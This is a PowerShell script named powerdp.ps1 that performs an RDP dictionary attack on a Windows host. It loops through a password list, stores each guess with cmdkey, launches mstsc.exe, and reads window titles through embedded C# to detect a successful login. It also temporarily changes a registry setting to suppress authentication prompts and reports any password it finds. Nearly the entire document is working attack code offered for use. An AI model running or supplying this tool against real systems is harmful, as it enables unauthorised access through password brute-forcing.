<#
.SYNOPSIS
    Performs rdp dictionary attack on specified windows device

.DESCRIPTION
    This script will perform rdp dictionary attack using given dictionary via 'mstsc.exe'

.PARAMETER t
    Specifies target computer's address
    
.PARAMETER u
    Specifies username
    
.PARAMETER d
    Specifies dictionary's path
    
.PARAMETER o
    Specifies output file's path
    
.PARAMETER to
    Specifies timeout value for connection in seconds
    
.EXAMPLE
    PS> .\powerdp.ps1 -t 192.168.1.100 -u user1 -d .\dictionary.txt
    
    This command performs rdp dictionary attack on 'user1' at '192.168.1.100'
    with possible passwords the 'dictionary.txt' contains

.EXAMPLE
    PS> .\powerdp.ps1 -t 192.168.1.100 -u user1 -d .\dictionary.txt -o out.txt
    
    With option '-o' this command writes result of attack to 'out.txt'

.NOTES
    Author: Burak Tekin
    Date  : April, 2018
#>

Param (

    [Parameter(Mandatory = $true)]
	[string]$t,

    [Parameter(Mandatory = $true)]
	[string]$u,
    
    [Parameter(Mandatory = $true)]
	[string]$d,
	
    [string]$o,
    
    [int]$to
)

if($to) {$timeout = ($to*10)}
else {$timeout = 50}
Write-Host $timeout

$code = @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Wnd {

	public class WndHelper {

		
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowTextLength(IntPtr hWnd);

		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);

		[DllImport("user32.dll")]
		private static extern IntPtr FindWindow(string s1, string s2);

		[DllImport("user32.dll")]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		public static bool isFail(int pid) {
			
			uint p = 0;
			uint t = GetWindowThreadProcessId(FindWindow(null,"Windows Security"), out p);
			if(p != 0 && pid == p)
				return true;
			return false;
	
		}

		public static bool isSucc(int pid, string target) {
			
			Process p = Process.GetProcessById(pid);
			IntPtr hWnd = p.MainWindowHandle;
			int length = (int)GetWindowTextLength(hWnd);
			System.Text.StringBuilder sb = new System.Text.StringBuilder(length+1);
			
			GetWindowText(hWnd, sb, sb.Capacity);
			if(sb.ToString().Contains(target))
				return true;
			return false;
		}

	}

}
'@
Add-Type $code

Function Rdp-Connect {

	Param (
         	[string] $address,
     		[string] $user,
         	[string] $pass
	)

	cmdkey /add:$address /user:$user /pass:$pass
	$ps = Start-Process mstsc.exe /v:$address -PassThru
	return $ps.id

}

$w_helper = [Wnd.WndHelper]
$dict = @{}
$isFound = $false

New-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client" -Name "AuthenticationLevelOverride" -Value 0 -PropertyType "DWord" | Out-Null
 
foreach($line in (Get-Content $d)){
    Write-Host "Attempting for Pasword:" $line
	$p_id = Rdp-Connect -address $t -user $u -pass $line

	for($i = 0; $i -lt $timeout; $i++) {
		sleep -m 100
		if($w_helper::isFail($p_id[2])) {
			kill $p_id[2]
			$dict.add($line, 'x')
            $timeout = 10
			break
		}else {
			if($w_helper::isSucc($p_id[2], $t)) {
				kill $p_id[2]
				$pass = $line
				$isFound = $true
				break
			}
		}
	}
	
	if($isFound) {break}

	if($dict.$line -ne 'x') {
		kill $p_id[2]
		$dict.add($line, '?')
	}

}

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client" -Name "AuthenticationLevelOverride"

if($isFound) {Write-Host "Password Found for user:" $u " - Password:"$pass -ForegroundColor Green}
else {Write-Host "Password not Found for user:"$u -ForegroundColor Red}

if($o) {
    if($isFound) {
        $outp = "Password Found!`r`nAddress: "
        $outp += [string]$t
        $outp += "`t`tUser: "
        $outp += [string]$u
        $outp += [string]"`t`tPassword: "
        $outp += [string]$pass
    }else {
        if($dict.ContainsValue('?')) {
            $outp = "Password not Found. Some attempt(s) timed out.`r`nTimed out attemps for user: "
            $outp += [string]$u
            $outp += "`r`n"
            $dict.Keys | % {
                if($dict.$_ -eq '?') {
                    $outp += $_
                    $outp += "`r`n"
                }
            }
        }
        else {
            $outp = "Password not Found for user:"
            $outp += [string]$u
        }
    }
    Out-File -FilePath $o -InputObject $outp -Encoding ASCII
}
